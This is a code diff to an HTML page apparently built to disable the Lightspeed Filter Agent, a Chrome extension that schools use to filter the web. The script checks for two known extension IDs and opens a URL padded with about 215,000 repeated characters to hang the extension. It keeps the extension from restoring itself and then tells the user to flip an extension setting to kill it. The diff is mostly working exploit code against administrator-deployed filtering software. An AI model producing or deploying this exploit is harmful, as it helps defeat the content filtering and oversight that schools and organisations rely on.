@@ -75,28 +75,36 @@
     	}
     </style>
     <script>
-	function checkForExtension() { // Checks if u have lightspeed installed
-            const extURL = "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/blocked-image-search.png";
-            fetch(extURL)
-                .then(response => {
-                    if (!response.ok) {
-			const launchButton = document.querySelector("button");
-                	launchButton.remove();
-            		const message = document.createElement("p");
-            	        message.innerText = "You don't have Lightspeed Filter Agent installed.";
-			message.style.userSelect = "none";
-                        document.body.appendChild(message);
-                    }
-                })
-                .catch(() => {
-		    const launchButton = document.querySelector("button");
-                    launchButton.remove();
-            	    const message = document.createElement("p");
-            	    message.innerText = "You don't have Lightspeed Filter Agent installed.";
-		    message.style.userSelect = "none";
-                    document.body.appendChild(message);
-                });
-        }
+	function checkForExtension() {  // Checks if u have lightspeed installed
+    	const IDs = [
+        	"adkcpkpghahmbopkjchobieckeoaoeem",
+        	"ehnniokiiebpinnfegpkdlcamgdcaaje"
+    	];
+    
+    	let found = false;
+
+    	for (let extID of IDs) {
+        	const extURL = `chrome-extension://${extID}/blocked-image-search.png`;
+        	fetch(extURL)
+            	.then(response => {
+                	if (response.ok && !found) {
+                    	found = true;
+                    	window.lightspedID = extID; // this is the lightspeed id you have
+                	}
+            	})
+    	}
+
+    	setTimeout(() => {
+        	if (!found) {
+            	const launchButton = document.querySelector("button");
+            	launchButton.remove();
+            	const message = document.createElement("p");
+            	message.innerText = "You don't have Lightspeed Filter Agent installed.";
+            	message.style.userSelect = "none";
+            	document.body.appendChild(message);
+        	}
+    	}, 100);
+	}
 
 	window.onload = checkForExtension;
 	    
@@ -140,13 +148,13 @@
     	    overlay.appendChild(hanging);
     	    document.body.appendChild(overlay);
 
-	    let amongus = "ඞ".repeat(200000); // help im stuck in 2020
+	    let amongus = "ඞ".repeat(215000); // help im stuck in 2020
 	    let killURL = "https://" + amongus + "@hanging..."; // this can be any blocked site (they block invalid URIs like "hanging...")
     	    let extWin = window.open(killURL);
     
     	    setTimeout(function () {
                 let iframe = document.createElement("iframe"); // iframe so that lightspeed wont restore itself when the switch is flipped
-                iframe.src = "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/blocked-image-search.png";
+                iframe.src = `chrome-extension://${window.lightspedID}/blocked-image-search.png`;
             	iframe.style.width = "10px";
             	iframe.style.height = "10px";
             	iframe.style.border = "none";
@@ -213,7 +221,7 @@
             header.appendChild(leftSection);
 
             const instructions = document.createElement("p");
-            instructions.innerHTML = "Lightspeed has been hanged. To kill it, open the following URL in a new tab (don't close this one) and flip the switch titled \"Allow access to file URLs\". <br><br> chrome://extensions/?id=adkcpkpghahmbopkjchobieckeoaoeem";
+            instructions.innerHTML = "Lightspeed has been hanged. To kill it, open the following URL in a new tab (don't close this one) and flip the switch titled \"Allow access to file URLs\". <br><br> " + `chrome://extensions/?id=${window.lightspedID}`;
             instructions.style.padding = "15px";
             instructions.style.textAlign = "center";
 
